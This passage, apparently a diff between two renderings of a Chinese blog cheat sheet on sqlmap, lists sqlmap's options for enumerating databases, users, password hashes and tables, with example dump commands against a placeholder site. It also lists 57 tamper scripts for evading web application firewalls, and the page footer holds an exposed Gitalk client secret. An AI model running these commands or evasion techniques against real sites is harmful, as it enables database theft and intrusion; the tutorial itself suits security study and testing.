--current-db        Retrieve DBMS current database</span><br><span class="line">        检索当前连接的数据库</span><br><span class="line">    --hostname          Retrieve DBMS server hostname</span><br><span class="line">        检索服务器的主机名</span><br><span class="line">    --is-dba            Detect if the DBMS current user is DBA</span><br><span class="line">        检测是不是dba，就是root权限咯</span><br><span class="line">    --users             Enumerate DBMS users</span><br><span class="line">        枚举数据库用户</span><br><span class="line">    --passwords         Enumerate DBMS users password hashes</span><br><span class="line">        枚举数据库用户的哈希值</span><br><span class="line">    --privileges        Enumerate DBMS users privileges</span><br><span class="line">        枚举数据库用户的权限</span><br><span class="line">    --roles             Enumerate DBMS users roles</span><br><span class="line">        枚举数据库用户的角色</span><br><span class="line">    --dbs               Enumerate DBMS databases</span><br><span class="line">        枚举数据库有哪些</span><br><span class="line">    --tables            Enumerate DBMS database tables</span><br><span class="line">        枚举数据表名</span><br><span class="line">    --columns           Enumerate DBMS database table columns</span><br><span class="line">        枚举列名</span><br><span class="line">    --schema            Enumerate DBMS schema</span><br><span class="line">        这个测试过，将所有的数据库的表的基本信息都枚举了，有哪些列，列的数据类型，具体数据就没有枚举</span><br><span class="line">    --count             Retrieve number of entries for table(s)</span><br><span class="line">        枚举表格个数</span><br><span class="line">    --dump              Dump DBMS database table entries</span><br><span class="line">        输出数据库表的数据</span><br><span class="line">    --dump-all          Dump all DBMS databases tables entries</span><br><span class="line">        输出所有</span><br><span class="line">    --search            Search column(s), table(s) and&#x2F;or database name(s)</span><br><span class="line">        查找特定的列名，表名或数据库名，配合下面的-D,-C,-T</span><br><span class="line">    --comments          Retrieve DBMS comments</span><br><span class="line">        枚举数据库的注释</span><br><span class="line">    -D DB               DBMS database to enumerate</span><br><span class="line">        指定数据库名</span><br><span class="line">    -T TBL              DBMS database table(s) to enumerate</span><br><span class="line">        指定表名</span><br><span class="line">    -C COL              DBMS database table column(s) to enumerate</span><br><span class="line">        指定列名</span><br><span class="line">    -X EXCLUDECOL       DBMS database table column(s) to not enumerate</span><br><span class="line">        指定不枚举那个列</span><br><span class="line">    -U USER             DBMS user to enumerate</span><br><span class="line">        枚举用户，但单独用这个参数感觉没什么用啊，这个可能要看源码才能解决了，估计要配合其他参数</span><br><span class="line">    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables</span><br><span class="line">        枚举时排除系统的数据库</span><br><span class="line">    --pivot-column&#x3D;P..  Pivot column name</span><br><span class="line">        以某一列为核心？这个用过没感觉出什么用</span><br><span class="line">    --where&#x3D;DUMPWHERE   Use WHERE condition while table dumping</span><br><span class="line">        使用where调试限制table的输出</span><br><span class="line">    --start&#x3D;LIMITSTART  First query output entry to retrieve</span><br><span class="line">        指定开始从第几行开始输出，如--start&#x3D;3，前两行就不输出了</span><br><span class="line">    --stop&#x3D;LIMITSTOP    Last query output entry to retrieve</span><br><span class="line">        指定从第几行开始停止输出</span><br><span class="line">    --first&#x3D;FIRSTCHAR   First query output word character to retrieve</span><br><span class="line">        指定只输出第几个字符开始输出，盲注才有效，亲测</span><br><span class="line">    --last&#x3D;LASTCHAR     Last query output word character to retrieve</span><br><span class="line">        指定只输出第几个字符停止输出，盲注才有效，亲测，跟上面的配合指定范围，</span><br><span class="line">        如 ：--first 3 --last 5  只输出3到5位置的字符</span><br><span class="line">    --sql-query&#x3D;QUERY   SQL statement to be executed</span><br><span class="line">        指定执行我们的sql语句</span><br><span class="line">    --sql-shell         Prompt for an interactive SQL shell</span><br><span class="line">        返回一个sql的shell</span><br><span class="line">    --sql-file&#x3D;SQLFILE  Execute SQL statements from given file(s)</span><br><span class="line">        从文件中读取执行sql语句</span><br><span class="line"> </span><br><span class="line">-D DB               要进行枚举的指定数据库名</span><br><span class="line">   -T TBL              DBMS数据库表枚举</span><br><span class="line">   -C COL             DBMS数据库表列枚举</span><br><span class="line">   -X EXCLUDECOL     DBMS数据库表不进行枚举</span><br><span class="line">.&#x2F;sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;www.xxx.com&quot; &#x2F;&#x2F;查是否有注入，一些基本信息  </span><br><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&quot; --dbs &#x2F;&#x2F;枚举数据库</span><br><span class="line">.&#x2F;sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;www.xxx.com&quot; --tables &#x2F;&#x2F;表名枚举</span><br><span class="line">.&#x2F;sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;www.xxx.com&quot; --columns -T 数据库表名 &#x2F;&#x2F;字段枚举</span><br><span class="line">.&#x2F;sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;www.xxx.com&quot; --dump -T 数据库表名 -C &quot;字段1，字段2，字段3&quot; &#x2F;&#x2F;dump</span><br><span class="line">.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&quot; --dump -D 数据库名 -T 表名 -C &quot;字段名1，字段名2，字段名3&quot; &#x2F;&#x2F;dump</span><br></pre></td></tr></table></figure>
 
 <h1 id="–temper选择总结"><a href="#–temper选择总结" class="headerlink" title="–temper选择总结"></a>–temper选择总结</h1><p>参考链接：<a href="https://www.freebuf.com/sectool/179035.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/179035.html</a><br>sqlmap版本当前为1.2.7.20，共有57个tamper脚本，与1.0版本相比新增了19个脚本。</p>
-<pre><code class="hljs angelscript">序号  脚本名称    注释
-<span class="hljs-number">1</span>   <span class="hljs-number">0x2c</span>har 将每个编码后的字符转换为等价表达
-<span class="hljs-number">2</span>   apostrophemask  单引号替换为Utf8字符
-<span class="hljs-number">3</span>   apostrophenullencode    替换双引号为%<span class="hljs-number">00</span>%<span class="hljs-number">27</span>
-<span class="hljs-number">4</span>   appendnullbyte  有效代码后添加%<span class="hljs-number">00</span>
-<span class="hljs-number">5</span>   base64encode    使用base64编码
-<span class="hljs-number">6</span>   between 比较符替换为between
-<span class="hljs-number">7</span>   bluecoat    空格替换为随机空白字符，等号替换为like
-<span class="hljs-number">8</span>   chardoubleencode    双url编码
-<span class="hljs-number">9</span>   charencode  将url编码
-<span class="hljs-number">10</span>  charunicodeencode   使用unicode编码
-<span class="hljs-number">11</span>  charunicodeescape   以指定的payload反向编码未编码的字符
-<span class="hljs-number">12</span>  commalesslimit  改变limit语句的写法
-<span class="hljs-number">13</span>  commalessmid    改变mid语句的写法
-<span class="hljs-number">14</span>  commentbeforeparentheses    在括号前加内联注释
-<span class="hljs-number">15</span>  concat2concatws 替换CONCAT为CONCAT_WS
-<span class="hljs-number">16</span>  equaltolike 等号替换为like
-<span class="hljs-number">17</span>  escapequotes    双引号替换为\\\\
-<span class="hljs-number">18</span>  greatest    大于号替换为greatest
-<span class="hljs-number">19</span>  halfversionedmorekeywords   在每个关键字前加注释
-<span class="hljs-number">20</span>  htmlencode  html编码所有非字母和数字的字符
-<span class="hljs-number">21</span>  ifnull2casewhenisnull   改变ifnull语句的写法
-<span class="hljs-number">22</span>  ifnull2ifisnull 替换ifnull为<span class="hljs-keyword">if</span>(isnull(A))
-<span class="hljs-number">23</span>  informationschemacomment    标示符后添加注释
-<span class="hljs-number">24</span>  least   替换大于号为least
-<span class="hljs-number">25</span>  lowercase   全部替换为小写值
-<span class="hljs-number">26</span>  modsecurityversioned    空格替换为查询版本的注释
-<span class="hljs-number">27</span>  modsecurityzeroversioned    添加完整的查询版本的注释
-<span class="hljs-number">28</span>  multiplespaces  添加多个空格
-<span class="hljs-number">29</span>  nonrecursivereplacement 替换预定义的关键字
-<span class="hljs-number">30</span>  overlongutf8    将所有字符转义为utf8
-<span class="hljs-number">31</span>  overlongutf8more    以指定的payload转换所有字符
-<span class="hljs-number">32</span>  percentage  每个字符前添加%
-<span class="hljs-number">33</span>  plus2concat 将加号替换为concat函数
-<span class="hljs-number">34</span>  plus2fnconcat   将加号替换为ODBC函数&#123;fn CONCAT()&#125;
-<span class="hljs-number">35</span>  randomcase  字符大小写随机替换
-<span class="hljs-number">36</span>  randomcomments  <span class="hljs-comment">/**/</span>分割关键字
-<span class="hljs-number">37</span>  securesphere    添加某字符串
-<span class="hljs-number">38</span>  sp_password 追加sp_password字符串
-<span class="hljs-number">39</span>  space2comment   空格替换为<span class="hljs-comment">/**/</span>
-<span class="hljs-number">40</span>  space2dash  空格替换为–加随机字符
-<span class="hljs-number">41</span>  space2hash  空格替换为#加随机字符
-<span class="hljs-number">42</span>  space2morecomment   空格替换为<span class="hljs-comment">/**_**/</span>
-<span class="hljs-number">43</span>  space2morehash  空格替换为#加随机字符及换行符
-<span class="hljs-number">44</span>  space2mssqlblank    空格替换为其他空符号
-<span class="hljs-number">45</span>  space2mssqlhash 空格替换为%<span class="hljs-number">23</span>%<span class="hljs-number">0</span>A
-<span class="hljs-number">46</span>  space2mysqlblank    空格替换为其他空白符号
-<span class="hljs-number">47</span>  space2mysqldash 空格替换为–%<span class="hljs-number">0</span>A
-<span class="hljs-number">48</span>  space2plus  空格替换为加号
-<span class="hljs-number">49</span>  space2randomblank   空格替换为备选字符集中的随机字符
-<span class="hljs-number">50</span>  symboliclogical AND和OR替换为&amp;&amp;和||
-<span class="hljs-number">51</span>  unionalltounion union all select替换为union select
-<span class="hljs-number">52</span>  unmagicquotes   宽字符绕过GPC
-<span class="hljs-number">53</span>  uppercase   全部替换为大写值
-<span class="hljs-number">54</span>  varnish 添加HTTP头
-<span class="hljs-number">55</span>  versionedkeywords   用注释封装每个非函数的关键字
-<span class="hljs-number">56</span>  versionedmorekeywords   使用注释绕过
-<span class="hljs-number">57</span>  xforwardedfor   添加伪造的HTTP头</code></pre>
-<pre><code class="hljs angelscript">【MySQL】
-版本  可用tamper编号  脚本名称
-<span class="hljs-number">4</span>/<span class="hljs-number">5.0</span>/<span class="hljs-number">5.5</span>   <span class="hljs-number">1</span>   <span class="hljs-number">0x2c</span>har
-<span class="hljs-number">6</span>   between
-<span class="hljs-number">9</span>   charencode
-<span class="hljs-number">16</span>  concat2concatws
-<span class="hljs-number">18</span>  greatest
-<span class="hljs-number">24</span>  least
-<span class="hljs-number">25</span>  lowercase
-<span class="hljs-number">35</span>  randomcase
-<span class="hljs-number">39</span>  space2comment
-<span class="hljs-number">49</span>  space2randomblank
-<span class="hljs-number">53</span>  uppercase
-<span class="hljs-number">5.1</span> <span class="hljs-number">7</span>   bluecoat
-<span class="hljs-number">46</span>  space2mysqlblank
-<span class="hljs-number">5.0</span>/<span class="hljs-number">5.5</span> <span class="hljs-number">12</span>  commalesslimit
-<span class="hljs-number">13</span>  commalessmid
-<span class="hljs-number">21</span>  ifnull2casewhenisnull
-<span class="hljs-number">22</span>  ifnull2ifisnull
-<span class="hljs-number">42</span>  space2morecomment
-<span class="hljs-number">5.0</span> <span class="hljs-number">15</span>  concat2concatws
-<span class="hljs-number">26</span>  modsecurityversioned
-<span class="hljs-number">27</span>  modsecurityzeroversioned
-<span class="hljs-number">4.0</span>/<span class="hljs-number">5.0</span> <span class="hljs-number">41</span>  space2hash
-<span class="hljs-number">5.1</span><span class="hljs-number">.56</span>  <span class="hljs-number">10</span>  charunicodeencode
-<span class="hljs-number">5.1</span><span class="hljs-number">.56</span>/<span class="hljs-number">5.5</span><span class="hljs-number">.11</span>   <span class="hljs-number">32</span>  percentage
-<span class="hljs-number">56</span>  versionedmorekeywords
-<span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.0</span><span class="hljs-number">.22</span>   <span class="hljs-number">19</span>  halfversionedmorekeywords
-<span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.1</span><span class="hljs-number">.56</span>/<span class="hljs-number">5.5</span><span class="hljs-number">.11</span>    <span class="hljs-number">55</span>  versionedkeywords
-<span class="hljs-number">5.1</span><span class="hljs-number">.41</span>  <span class="hljs-number">43</span>  space2morehash
-未指定版本   <span class="hljs-number">14</span>  commentbeforeparentheses
-<span class="hljs-number">40</span>  space2dash
-<span class="hljs-number">45</span>  space2mssqlhash
-<span class="hljs-number">47</span>  space2mysqldash</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">序号  脚本名称    注释</span><br><span class="line">1   0x2char 将每个编码后的字符转换为等价表达</span><br><span class="line">2   apostrophemask  单引号替换为Utf8字符</span><br><span class="line">3   apostrophenullencode    替换双引号为%00%27</span><br><span class="line">4   appendnullbyte  有效代码后添加%00</span><br><span class="line">5   base64encode    使用base64编码</span><br><span class="line">6   between 比较符替换为between</span><br><span class="line">7   bluecoat    空格替换为随机空白字符，等号替换为like</span><br><span class="line">8   chardoubleencode    双url编码</span><br><span class="line">9   charencode  将url编码</span><br><span class="line">10  charunicodeencode   使用unicode编码</span><br><span class="line">11  charunicodeescape   以指定的payload反向编码未编码的字符</span><br><span class="line">12  commalesslimit  改变limit语句的写法</span><br><span class="line">13  commalessmid    改变mid语句的写法</span><br><span class="line">14  commentbeforeparentheses    在括号前加内联注释</span><br><span class="line">15  concat2concatws 替换CONCAT为CONCAT_WS</span><br><span class="line">16  equaltolike 等号替换为like</span><br><span class="line">17  escapequotes    双引号替换为\\\\</span><br><span class="line">18  greatest    大于号替换为greatest</span><br><span class="line">19  halfversionedmorekeywords   在每个关键字前加注释</span><br><span class="line">20  htmlencode  html编码所有非字母和数字的字符</span><br><span class="line">21  ifnull2casewhenisnull   改变ifnull语句的写法</span><br><span class="line">22  ifnull2ifisnull 替换ifnull为if(isnull(A))</span><br><span class="line">23  informationschemacomment    标示符后添加注释</span><br><span class="line">24  least   替换大于号为least</span><br><span class="line">25  lowercase   全部替换为小写值</span><br><span class="line">26  modsecurityversioned    空格替换为查询版本的注释</span><br><span class="line">27  modsecurityzeroversioned    添加完整的查询版本的注释</span><br><span class="line">28  multiplespaces  添加多个空格</span><br><span class="line">29  nonrecursivereplacement 替换预定义的关键字</span><br><span class="line">30  overlongutf8    将所有字符转义为utf8</span><br><span class="line">31  overlongutf8more    以指定的payload转换所有字符</span><br><span class="line">32  percentage  每个字符前添加%</span><br><span class="line">33  plus2concat 将加号替换为concat函数</span><br><span class="line">34  plus2fnconcat   将加号替换为ODBC函数&#123;fn CONCAT()&#125;</span><br><span class="line">35  randomcase  字符大小写随机替换</span><br><span class="line">36  randomcomments  &#x2F;**&#x2F;分割关键字</span><br><span class="line">37  securesphere    添加某字符串</span><br><span class="line">38  sp_password 追加sp_password字符串</span><br><span class="line">39  space2comment   空格替换为&#x2F;**&#x2F;</span><br><span class="line">40  space2dash  空格替换为–加随机字符</span><br><span class="line">41  space2hash  空格替换为#加随机字符</span><br><span class="line">42  space2morecomment   空格替换为&#x2F;**_**&#x2F;</span><br><span class="line">43  space2morehash  空格替换为#加随机字符及换行符</span><br><span class="line">44  space2mssqlblank    空格替换为其他空符号</span><br><span class="line">45  space2mssqlhash 空格替换为%23%0A</span><br><span class="line">46  space2mysqlblank    空格替换为其他空白符号</span><br><span class="line">47  space2mysqldash 空格替换为–%0A</span><br><span class="line">48  space2plus  空格替换为加号</span><br><span class="line">49  space2randomblank   空格替换为备选字符集中的随机字符</span><br><span class="line">50  symboliclogical AND和OR替换为&amp;&amp;和||</span><br><span class="line">51  unionalltounion union all select替换为union select</span><br><span class="line">52  unmagicquotes   宽字符绕过GPC</span><br><span class="line">53  uppercase   全部替换为大写值</span><br><span class="line">54  varnish 添加HTTP头</span><br><span class="line">55  versionedkeywords   用注释封装每个非函数的关键字</span><br><span class="line">56  versionedmorekeywords   使用注释绕过</span><br><span class="line">57  xforwardedfor   添加伪造的HTTP头</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">【MySQL】</span><br><span class="line">版本  可用tamper编号  脚本名称</span><br><span class="line">4&#x2F;5.0&#x2F;5.5   1   0x2char</span><br><span class="line">6   between</span><br><span class="line">9   charencode</span><br><span class="line">16  concat2concatws</span><br><span class="line">18  greatest</span><br><span class="line">24  least</span><br><span class="line">25  lowercase</span><br><span class="line">35  randomcase</span><br><span class="line">39  space2comment</span><br><span class="line">49  space2randomblank</span><br><span class="line">53  uppercase</span><br><span class="line">5.1 7   bluecoat</span><br><span class="line">46  space2mysqlblank</span><br><span class="line">5.0&#x2F;5.5 12  commalesslimit</span><br><span class="line">13  commalessmid</span><br><span class="line">21  ifnull2casewhenisnull</span><br><span class="line">22  ifnull2ifisnull</span><br><span class="line">42  space2morecomment</span><br><span class="line">5.0 15  concat2concatws</span><br><span class="line">26  modsecurityversioned</span><br><span class="line">27  modsecurityzeroversioned</span><br><span class="line">4.0&#x2F;5.0 41  space2hash</span><br><span class="line">5.1.56  10  charunicodeencode</span><br><span class="line">5.1.56&#x2F;5.5.11   32  percentage</span><br><span class="line">56  versionedmorekeywords</span><br><span class="line">4.0.18&#x2F;5.0.22   19  halfversionedmorekeywords</span><br><span class="line">4.0.18&#x2F;5.1.56&#x2F;5.5.11    55  versionedkeywords</span><br><span class="line">5.1.41  43  space2morehash</span><br><span class="line">未指定版本   14  commentbeforeparentheses</span><br><span class="line">40  space2dash</span><br><span class="line">45  space2mssqlhash</span><br><span class="line">47  space2mysqldash</span><br></pre></td></tr></table></figure>
 <p>参考链接：<a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-                    
-                  </div>
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2019/02/26/%E8%BD%AC%E8%BD%BD-WAF%E6%94%BB%E9%98%B2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%AF%87/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">转载 | WAF攻防之SQL注入篇</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/">
-                        <span class="hidden-mobile">PHP之GET传参黑名单绕过</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-05-15T08:31:22.000Z" itemprop="dateUpdated">2020-05-15 16:31:22</time>
+</span><br>
+
+
+        
+        玩的开心
+        
+    </div>
+    
+    <footer>
+        <a href="http://zhzhdoai.github.io">
+            <img src="/img/avatar.jpg" alt="osword">
+            osword
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
 
             
-          </article>
-        </div>
-      </div>
-    </div>
+<div class="page-share-wrap">
     
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div id="tocbot"></div>
-</div>
 
-      </div>
-    
-  </div>
-</div>
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《sqlmap操作详解(常用备忘录)》 — osword's blog&url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&via=http://zhzhdoai.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
 
-<!-- Custom -->
 
 
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
     </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
 </div>
-  
 
-  
 
-  
 
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
+        </div>
     </div>
+
     
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/02/26/%E8%BD%AC%E8%BD%BD-WAF%E6%94%BB%E9%98%B2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E7%AF%87/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">转载 | WAF攻防之SQL注入篇</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/02/20/PHP%E4%B9%8BGET%E4%BC%A0%E5%8F%82%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">PHP之GET传参黑名单绕过</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
 
     
 
-    
-  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script src="/js/md5.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '7d7576c71632f14d639a',
+            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
+            repo: 'zhzhdoai.github.io',
+            owner: 'zhzhdoai',
+            admin: 'zhzhdoai',
+            id: md5(location.pathname),
+            perPage: 50,
+            distractionFreeMode: 'false'
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>osword &copy; 2015 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
 
 
 
-  
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/&title=《sqlmap操作详解(常用备忘录)》 — osword's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
